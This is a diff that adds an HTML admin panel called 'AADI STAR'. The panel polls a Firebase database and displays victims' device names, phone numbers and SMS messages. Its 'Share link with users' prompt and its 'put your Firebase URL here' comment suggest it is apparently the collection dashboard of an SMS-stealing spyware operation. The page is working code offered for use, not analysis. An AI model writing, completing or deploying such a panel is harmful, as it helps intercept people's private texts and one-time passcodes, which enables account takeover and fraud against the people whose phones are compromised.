@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AADI STAR - Admin Panel</title>
+<style>
+body{background:#070c14;color:#fff;font-family:Arial;padding:20px}
+.header{background:#0f172a;padding:15px;border-radius:10px;margin-bottom:20px}
+.logo{color:#00c896;font-size:24px;font-weight:bold}
+.stats{display:flex;gap:20px;margin-top:10px}
+.stat{background:#1a1f2e;padding:5px 12px;border-radius:20px}
+.device-card{background:#0f172a;border-radius:10px;padding:15px;margin-bottom:15px}
+.device-name{color:#00c896;font-weight:bold}
+.sms-item{background:#1e293b;border-radius:8px;padding:10px;margin-top:10px}
+.sms-sender{color:#00c896;font-size:12px}
+.sms-time{color:#64748b;font-size:11px}
+.sms-body{font-size:13px;margin-top:5px}
+.refresh{background:#00c896;border:none;padding:8px 20px;border-radius:20px;cursor:pointer;float:right}
+</style>
+</head>
+<body>
+
+<div class="header">
+<div class="logo">⭐ AADI STAR PANEL</div>
+<div class="stats">
+<div class="stat">📱 Devices: <span id="deviceCount">0</span></div>
+<div class="stat">📨 SMS: <span id="smsCount">0</span></div>
+</div>
+<button class="refresh" onclick="loadData()">🔄 Refresh</button>
+</div>
+
+<div id="devices"></div>
+
+<script>
+// 🔥 APNA FIREBASE URL YAHAN DAALO 🔥
+const FIREBASE_URL = "https://aadi-star-panel-default-rtdb.firebaseio.com";
+
+async function loadData() {
+    document.getElementById('devices').innerHTML = '<div style="text-align:center;padding:40px">Loading...</div>';
+    
+    try {
+        const devicesRes = await fetch(`${FIREBASE_URL}/devices.json`);
+        const devices = await devicesRes.json();
+        
+        let deviceCount = 0;
+        let totalSms = 0;
+        let html = '';
+        
+        if (devices) {
+            deviceCount = Object.keys(devices).length;
+            
+            for (const [deviceId, device] of Object.entries(devices)) {
+                const smsRes = await fetch(`${FIREBASE_URL}/sms/${deviceId}.json`);
+                const smsData = await smsRes.json();
+                const smsList = smsData ? Object.values(smsData).sort((a,b) => b.timestamp - a.timestamp) : [];
+                totalSms += smsList.length;
+                
+                html += `
+                <div class="device-card">
+                    <div class="device-name">📱 ${device.name || 'User'}</div>
+                    <div>📞 ${device.phoneNumber || 'No number'}</div>
+                    <div>🆔 ${deviceId.slice(0,16)}...</div>
+                    <div style="margin-top:10px"><b>SMS (${smsList.length})</b></div>
+                    ${smsList.slice(0,10).map(sms => `
+                        <div class="sms-item">
+                            <div class="sms-sender">📨 ${sms.sender}</div>
+                            <div class="sms-time">⏰ ${new Date(sms.timestamp).toLocaleString()}</div>
+                            <div class="sms-body">${sms.body.slice(0,150)}</div>
+                        </div>
+                    `).join('')}
+                    ${smsList.length === 0 ? '<div style="color:#64748b;padding:10px">No SMS yet</div>' : ''}
+                </div>`;
+            }
+        }
+        
+        document.getElementById('deviceCount').innerText = deviceCount;
+        document.getElementById('smsCount').innerText = totalSms;
+        document.getElementById('devices').innerHTML = html || '<div style="text-align:center;padding:40px">No devices yet. Share link with users.</div>';
+    } catch(e) {
+        document.getElementById('devices').innerHTML = '<div style="text-align:center;padding:40px;color:#ef4444">Error loading data. Check Firebase URL.</div>';
+    }
+}
+
+loadData();
+setInterval(loadData, 5000);
+</script>
+</body>
+</html>
